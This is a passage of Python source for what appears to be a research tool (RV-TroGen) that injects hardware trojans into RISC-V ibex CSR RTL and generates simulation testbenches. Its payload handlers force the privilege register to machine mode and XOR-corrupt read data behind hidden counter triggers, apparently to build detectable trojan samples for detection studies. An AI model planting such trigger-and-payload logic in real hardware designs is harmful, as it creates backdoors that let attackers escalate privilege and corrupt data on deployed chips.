                override = f'\n            if (trojan_active) {priv_reg} <= PRIV_LVL_M;  // TROJAN'
                rtl = rtl[:last.end()] + override + rtl[last.end():]
                print(f"   ✅ Privilege: also overriding FF '{priv_reg}'")
                injected = True

        # FIX v3: ALSO corrupt csr_rdata_o to make trojan detectable in VCD
        # (pure privilege escalation invisible when already in machine mode)
        out_sig = find_observable_output(rtl)
        int_sig = find_internal_rdata(rtl)
        corruption = "32'hCAFEBABE"

        if out_sig and int_sig and re.search(rf'assign\s+{out_sig}\s*=\s*{int_sig}\s*;', rtl):
            new_rhs = f'trojan_active ? ({int_sig} ^ {corruption}) : {int_sig}'
            rtl = _replace_assign(rtl, out_sig, new_rhs, 'TROJAN Privilege: escalate + corrupt rdata')
            print(f"   ✅ Privilege: also XOR-corrupting '{out_sig}' for VCD detectability")
            injected = True
        elif out_sig and re.search(rf'assign\s+{out_sig}\s*=\s*([^;]+);', rtl):
            rtl = re.sub(
                rf'(\s*)assign\s+{out_sig}\s*=\s*([^;]+);',
                lambda m: f'{m.group(1)}assign {out_sig} = trojan_active ? ({m.group(2).strip()} ^ {corruption}) : {m.group(2).strip()};  // TROJAN Privilege: escalate + corrupt rdata',
                rtl, count=1)
            print(f"   ✅ Privilege: XOR-corrupting '{out_sig}' for VCD detectability")
            injected = True

        if not injected:
            print(f"   ⚠️  Privilege: could not find priv output/register")

        return rtl

    def apply_payload(self, rtl: str, pattern_name: str,
                      trigger_signal: str, payload_signal: str) -> str:
        """Dispatch to correct payload handler."""
        print(f"   📝 Applying {pattern_name} payload...")
        dispatch = {
            'DoS':          lambda: self.apply_dos_payload(rtl, payload_signal),
            'Integrity':    lambda: self.apply_integrity_payload(rtl, payload_signal),
            'Covert':       lambda: self.apply_covert_payload(rtl, trigger_signal, payload_signal),
            'Leak':         lambda: self.apply_leak_payload(rtl, trigger_signal, payload_signal),
            'Availability': lambda: self.apply_availability_payload(rtl, payload_signal),
            'Privilege':    lambda: self.apply_privilege_payload(rtl, payload_signal),
        }
        fn = dispatch.get(pattern_name)
        if fn:
            return fn()
        print(f"   ⚠️  Unknown pattern: {pattern_name}")
        return rtl

    # ── Signal Extraction from Snippet ────────────────────────────────────

    def extract_signals_from_snippet(self, snippet: str) -> Tuple[str, str, str]:
        """Extract pattern name, trigger signal, payload signal from snippet."""
        pm = re.search(r'(DoS|Integrity|Covert|Leak|Availability|Privilege)', snippet)
        pattern_name = pm.group(1) if pm else "Unknown"

        trigger_signal = None
        payload_signal = None

        tm = re.search(r'//.*?Trigger.*?:\s*(\w+)', snippet, re.IGNORECASE)
        if tm:
            trigger_signal = tm.group(1)

        pm2 = re.search(r'//.*?Payload.*?:\s*(\w+)', snippet, re.IGNORECASE)
        if pm2:
            payload_signal = pm2.group(1)

        if not trigger_signal:
            im = re.search(r'if\s*\((\w+)\)\s*begin', snippet)
            trigger_signal = im.group(1) if im else 'csr_op_en_i'

        if not payload_signal:
            payload_signal = trigger_signal

        return pattern_name, trigger_signal, payload_signal

    # ── Single Trojan Integration ──────────────────────────────────────────

    def integrate_single_trojan(self, trojan_file: Path, trojan_index: int) -> Optional[Path]:
        """Integrate one trojan into the original RTL."""
        print(f"\n🔧 Integrating: {trojan_file.name}")

        with open(trojan_file, 'r', encoding='utf-8') as f:
            snippet = f.read()

        pattern_name, trigger_signal, payload_signal = self.extract_signals_from_snippet(snippet)
        print(f"   Pattern:  {pattern_name}")
        print(f"   Trigger:  {trigger_signal}")
        print(f"   Payload:  {payload_signal}")

        threshold = random.randint(5000, 25000)
        trigger_logic = self.generate_varied_trigger(
            trojan_index, trigger_signal, payload_signal, threshold,
            self.original_rtl_content
        )
        print(f"   Trigger type: {trojan_index % 4 + 1}, threshold: {threshold}")

        trojaned = self.original_rtl_content

        first_logic = re.search(r'(always_ff|always_comb|assign\s+\w)', trojaned)
        header = trojaned[:first_logic.start()] if first_logic else trojaned[:500]
        last_paren = header.rfind(');')
        if last_paren != -1:
            insert_pos = last_paren + 2
            trojaned = trojaned[:insert_pos] + '\n' + trigger_logic + '\n' + trojaned[insert_pos:]
        else:
            m = re.search(r'module\s+\w+[^;]*;', trojaned)
            insert_pos = m.end() if m else 0
            trojaned = trojaned[:insert_pos] + '\n' + trigger_logic + '\n' + trojaned[insert_pos:]

        trojaned = self.apply_payload(trojaned, pattern_name, trigger_signal, payload_signal)

        new_name = f"{self.module_name}_trojan_{pattern_name}"
        trojaned = re.sub(rf'module\s+{self.module_name}\b', f'module {new_name}', trojaned, count=1)

        out_file = self.output_dir / f"{new_name}.sv"
        with open(out_file, 'w', encoding='utf-8') as f:
            f.write(trojaned)

        print(f"   ✅ Saved: {out_file.name}")
        return out_file

    # ── Testbench Generation ───────────────────────────────────────────────

    # ── Testbench Generation (FULLY GENERIC) ──────────────────────────────

    def generate_testbench(self, module_name: str, is_original: bool = False) -> Path:
        """
        Generate a fully generic, port-list-driven testbench for ANY module.
        No hardcoded port names. Works for ibex_csr, ibex_cs_registers,
        CVA6, RSD, or any future processor module.
        """
        tb_name  = f"tb_{module_name}"
        vcd_name = f"{module_name}.vcd"
        tb       = self._generate_generic_testbench(module_name, tb_name, vcd_name)

        tb_file  = self.tb_dir / f"{tb_name}.sv"
        with open(tb_file, 'w', encoding='utf-8') as f:
            f.write(tb)
        print(f"   ✅ TB generated: {tb_file.name}")
        return tb_file

    def _generate_generic_testbench(self, module_name: str,
                                     tb_name: str, vcd_name: str) -> str:
        """
        Fully generic testbench generator driven entirely by port list parsing.

        Algorithm:
          1. Parse ALL ports from original RTL using extract_module_ports()
          2. Declare each port as its exact type (logic/pkg-typed)
          3. Auto-detect clock, reset, write-enable, data signals
          4. Generate stimulus:
               - Clock: toggle every 5 ns
               - Reset: deassert after 100 ns
               - Write-enable signals: toggle on/off each cycle
               - Data signals (32-bit inputs): $urandom each cycle
               - Package-enum inputs: initialize to '0, then cycle through values
               - All other inputs: '0 or 1'b1 depending on name heuristics
          5. Connect ALL ports in DUT instantiation
          6. Dump ALL signals to VCD
        """
        clk  = self.clock_signal
        rst  = self.reset_signal
        rtl  = self.original_rtl_content

        # ── Parse ports ──────────────────────────────────────────────────
        ports = extract_module_ports(rtl)
        inputs  = ports['inputs']
        outputs = ports['outputs']

        if not inputs and not outputs:
            print(f"   ⚠️  Port parse failed, falling back to minimal TB")
            return self._generate_minimal_fallback_tb(module_name, tb_name, vcd_name, clk, rst)

        print(f"   ℹ️  Parsed {len(inputs)} inputs, {len(outputs)} outputs from port list")

        # ── Package imports ───────────────────────────────────────────────
        pkg_imports = ''
        if self.packages:
            pkg_imports = '\n    '.join(f'import {p}::*;' for p in self.packages)

        # ── Classify signals ──────────────────────────────────────────────
        clk_names  = {clk}
        rst_names  = {rst}

        # Write-enable heuristics
        we_hints   = {'we_i', 'wr_en_i', 'write_en_i', 'csr_op_en_i',
                      'csr_access_i', 'en_i', 'valid_i', 'req_i'}
        # Data/address heuristics
        data_hints = {'wdata', 'wr_data', 'data_i', 'csr_wdata', 'addr_i',
                      'csr_addr', 'pc_', 'hart_id', 'boot_addr'}
        # Signals to tie high
        tie_high   = {'csr_mtvec_init_i', 'ic_scr_key_valid_i'}
        # Signals to tie to non-zero constant
        nonzero    = {'hart_id_i': "32'h1", 'boot_addr_i': "32'h80000000"}

        # ── KEY FIX: pkg-enum signals driven during write cycle ───────────
        # Without this fix:
        #   csr_op_i stays at CSR_OP_READ (='0) → csr_wr=0 → csr_we_int=0 forever
        #   csr_addr_i stays at '0 = CSR_MVENDORID (read-only) → illegal write
        # These must be driven explicitly even though they are pkg-typed.
        pkg_stimulus = {
            'csr_op_i':   'CSR_OP_WRITE',  # ibex: makes csr_wr=1
            'csr_addr_i': 'CSR_MSCRATCH',  # ibex: writable non-privileged CSR
        }
        pkg_deassert = {
            'csr_op_i':   'CSR_OP_READ',   # restore to read after cycle
        }

        def is_we(name):
            return any(h in name.lower() for h in we_hints)

        def is_data(name):
            return any(h in name.lower() for h in data_hints)

        def get_zero(p):
            if p['is_pkg']:
                return p['pkg_init']
            if not p['width']:
                return "1'b0"
            return "'0"

        def get_urandom(p):
            if p['is_pkg']:
                return p['pkg_init']
            if not p['width']:
                return "$urandom_range(0,1)"
            return "$urandom"

        # ── Section 1: Signal Declarations ───────────────────────────────
        decl_lines = []
        decl_lines.append(f"    // ── Clock & Reset ────────────────────────────────────────────────")
        decl_lines.append(f"    logic {clk};")
        decl_lines.append(f"    logic {rst};")
        decl_lines.append(f"")

        decl_lines.append(f"    // ── Input signals ────────────────────────────────────────────────")
        for p in inputs:
            if p['name'] in clk_names | rst_names:
                continue  # already declared above
            type_str = p['raw_type']
            unpacked = p['unpacked']
            decl_lines.append(f"    {type_str} {p['name']}{unpacked};")

        decl_lines.append(f"")
        decl_lines.append(f"    // ── Output signals ───────────────────────────────────────────────")
        for p in outputs:
            type_str = p['raw_type']
            unpacked = p['unpacked']
            decl_lines.append(f"    {type_str} {p['name']}{unpacked};")

        declarations = '\n'.join(decl_lines)

        # ── Section 2: DUT Port Connections ──────────────────────────────
        conn_lines = []
        all_ports  = inputs + outputs
        for i, p in enumerate(all_ports):
            comma = ',' if i < len(all_ports) - 1 else ''
            conn_lines.append(f"        .{p['name']}({p['name']}){comma}")
        connections = '\n'.join(conn_lines)

        # ── Section 3: Initial values (non-clock, non-reset inputs) ──────
        init_lines = []
        for p in inputs:
            name = p['name']
            if name in clk_names | rst_names:
                continue
            if name in nonzero:
                val = nonzero[name]
            elif name in tie_high:
                val = "1'b1"
            elif p['is_pkg']:
                val = p['pkg_init']
            elif is_we(name):
                val = "1'b0"
            else:
                val = get_zero(p)
            init_lines.append(f"        {name} = {val};")
        init_block = '\n'.join(init_lines)

        # ── Section 4: Stimulus ───────────────────────────────────────────
        # Find primary write-enable and data signals for targeted stimulus
        primary_we   = None
        primary_data = None

        for p in inputs:
            if p['name'] in clk_names | rst_names:
                continue
            if primary_we   is None and is_we(p['name']):
                primary_we   = p['name']
            if primary_data is None and is_data(p['name']) and p['width'] in ('[31:0]', '[32:0]'):
                primary_data = p['name']

        # Build per-cycle stimulus block
        stim_lines = []
        stim_lines.append(f"        // Drive inputs each cycle to exercise all trigger conditions")
        stim_lines.append(f"        // csr_op_i=CSR_OP_WRITE makes csr_wr=1 -> csr_we_int toggles")
        stim_lines.append(f"        repeat (30000) begin")
        stim_lines.append(f"            @(posedge {clk});")

        for p in inputs:
            name = p['name']
            if name in clk_names | rst_names:
                continue
            if name in nonzero or name in tie_high:
                continue
            # KEY FIX: drive pkg-enum signals from pkg_stimulus table
            if p['is_pkg'] and name in pkg_stimulus:
                stim_lines.append(f"            {name} = {pkg_stimulus[name]};")
            elif p['is_pkg']:
                continue   # other pkg enums: leave at reset value
            elif is_we(name):
                stim_lines.append(f"            {name} = 1'b1;")
            elif is_data(name) and p['width']:
                stim_lines.append(f"            {name} = $urandom;")

        stim_lines.append(f"            @(posedge {clk});")
        # De-assert write enables and restore pkg signals
        for p in inputs:
            name = p['name']
            if name in clk_names | rst_names or name in nonzero or name in tie_high:
                continue
            if p['is_pkg'] and name in pkg_deassert:
                stim_lines.append(f"            {name} = {pkg_deassert[name]};")
            elif p['is_pkg']:
                continue
            elif is_we(name):
                stim_lines.append(f"            {name} = 1'b0;")
        stim_lines.append(f"        end")
        stimulus = '\n'.join(stim_lines)

        # ── Section 5: Monitor (first observable output) ─────────────────
        monitor_sig = None
        for p in outputs:
            if p['width'] in ('[31:0]', '[32:0]') and not p['is_pkg']:
                monitor_sig = p['name']
                break
        if monitor_sig is None and outputs:
            monitor_sig = outputs[0]['name']

        we_monitor = primary_we or (inputs[0]['name'] if inputs else clk)

        # ── Section 6: MRET block (Privilege TB only) ─────────────────────
        # CRITICAL: MRET drops priv_lvl_q to PRIV_LVL_U so Privilege trojan
        # escalation U→M is visible in VCD.
        # MUST NOT be in DoS/Availability TBs: user mode makes CSR_MSCRATCH
        # illegal (addr[9:8]=01 > priv=00) → illegal_csr_insn_o=1
        # → csr_we_int=0 always → DoS/Availability trojan effect invisible.
        is_privilege_tb = 'Privilege' in module_name
        has_mret_port   = any(p['name'] == 'csr_restore_mret_i' for p in inputs)

        if is_privilege_tb and has_mret_port:
            mret_block = (
                f"        // ── Drop to user mode (Privilege trojan only) ──\n"
                f"        // Sets priv_lvl_q=PRIV_LVL_U so trojan U→M escalation visible\n"
                f"        @(posedge {clk});\n"
                f"        csr_access_i = 1'b1; csr_addr_i = CSR_MSTATUS;\n"
                f"        csr_wdata_i  = 32'h00000000;  // MPP=00 = user mode\n"
                f"        csr_op_i     = CSR_OP_WRITE;  csr_op_en_i = 1'b1;\n"
                f"        @(posedge {clk});\n"
                f"        csr_access_i = 1'b0; csr_op_en_i = 1'b0;\n"
                f"        @(posedge {clk});\n"
                f"        csr_restore_mret_i = 1'b1;  // priv_lvl_q <= PRIV_LVL_U\n"
                f"        @(posedge {clk});\n"
                f"        csr_restore_mret_i = 1'b0;\n"
                f"        // priv_mode_id_o = 2'b00. Trojan escalates to 2'b11.\n"
                f"        #20;\n"
            )
        else:
            mret_block = ""   # all other trojans: stay in machine mode (M-mode CSR writes work)

        # ── Assemble full testbench ───────────────────────────────────────
        tb = f"""// =============================================================
// Auto-generated testbench for {module_name}
// Generated by RV-TroGen - fully generic port-driven TB
// Works for ANY processor module without modification
// =============================================================
`timescale 1ns/1ps

module {tb_name};
    {pkg_imports}

{declarations}

    // ── DUT ─────────────────────────────────────────────────────────────
    {module_name} dut (
{connections}
    );

    // ── Clock ────────────────────────────────────────────────────────────
    initial begin {clk} = 1'b0; forever #5 {clk} = ~{clk}; end

    // ── VCD Dump ─────────────────────────────────────────────────────────
    initial begin
        $dumpfile("{vcd_name}");
        $dumpvars(0, {tb_name});
    end

    // ── Stimulus ─────────────────────────────────────────────────────────
    initial begin
        // 1. Initialize all inputs
        {rst} = 1'b0;
{init_block}
        // 2. Release reset
        #100;
        {rst} = 1'b1;
        #20;

{mret_block}
        // Run 30,000 cycles of randomized stimulus
        //    Ensures trojan trigger counters (5000–25000) always activate
{stimulus}

        $display("[%0t] Simulation complete: 30,000 stimulus cycles", $time);
        #100;
        $finish;
    end

    // ── Monitor (log observable output changes) ──────────────────────────
    always @(posedge {clk}) begin
        if ({rst} && {we_monitor})
            $display("[%0t] active: {monitor_sig}=%0h", $time, {monitor_sig});
    end

endmodule
// =============================================================
// Port summary (parsed from original RTL):
//   Inputs:  {len(inputs)}
//   Outputs: {len(outputs)}
//   Packages: {self.packages or 'none'}
// =============================================================
"""
        return tb

    def _generate_minimal_fallback_tb(self, module_name, tb_name, vcd_name, clk, rst) -> str:
        """Absolute fallback: minimal TB when port parsing fails completely."""
        return f"""// Auto-generated minimal testbench for {module_name}
// NOTE: Port parsing failed - this is a skeleton only, manual editing required
`timescale 1ns/1ps
module {tb_name};
    logic {clk};
    logic {rst};

    {module_name} dut ( .{clk}({clk}), .{rst}({rst}) );

    initial begin {clk} = 1'b0; forever #5 {clk} = ~{clk}; end
    initial begin $dumpfile("{vcd_name}"); $dumpvars(0, {tb_name}); end
    initial begin
        {rst} = 1'b0; #100; {rst} = 1'b1;
        #300000; $finish;
    end
endmodule
"""

    # ── Full Pipeline ──────────────────────────────────────────────────────

    def process_all_trojans(self):
        """Integrate all found trojans and generate testbenches."""
        print(f"\n{'='*65}")
        print(f"  MULTI-TROJAN INTEGRATION - {self.module_name}")
        print(f"{'='*65}")

        trojan_files = self.find_trojan_files()
        if not trojan_files:
            print("\n❌ No trojan files found!")
            return []

        print(f"\n📋 Found {len(trojan_files)} trojan(s):")
        for f in trojan_files:
            print(f"   • {f.name}")

        # Original testbench
        print(f"\n🧪 Original testbench...")
        tb = self.generate_testbench(self.module_name, is_original=True)
        print(f"   ✅ {tb.name}")

        integrated = []
        for i, tf in enumerate(trojan_files):
            try:
                out = self.integrate_single_trojan(tf, i)
                if out:
                    tb = self.generate_testbench(out.stem)
                    print(f"   🧪 TB: {tb.name}")
                    integrated.append(out)
            except Exception as e:
                print(f"   ❌ Error processing {tf.name}: {e}")
                import traceback; traceback.print_exc()

        print(f"\n{'='*65}")
        print(f"  ✅ COMPLETE: {len(integrated)}/{len(trojan_files)} trojans integrated")
        print(f"  📂 RTL:  {self.output_dir}")
        print(f"  📂 TBs:  {self.tb_dir}")
        print(f"{'='*65}\n")
        return integrated


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def main():
    import argparse
    parser = argparse.ArgumentParser(
        description='Smart RTL-aware multi-trojan integration + testbench generation')
    parser.add_argument('rtl_file', help='Path to original RTL file')
    parser.add_argument('--trojans', '-t', help='Directory with trojan snippets')
    parser.add_argument('--output',  '-o', help='Output directory for trojaned RTL')
    parser.add_argument('--seed',    '-s', type=int, default=42,
                        help='Random seed for threshold generation (default: 42)')
    args = parser.parse_args()

    if not Path(args.rtl_file).exists():
        print(f"❌ RTL file not found: {args.rtl_file}")
        sys.exit(1)

    random.seed(args.seed)
    try:
        integrator = MultiTrojanIntegrator(args.rtl_file, args.trojans, args.output)
        integrator.process_all_trojans()
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        import traceback; traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()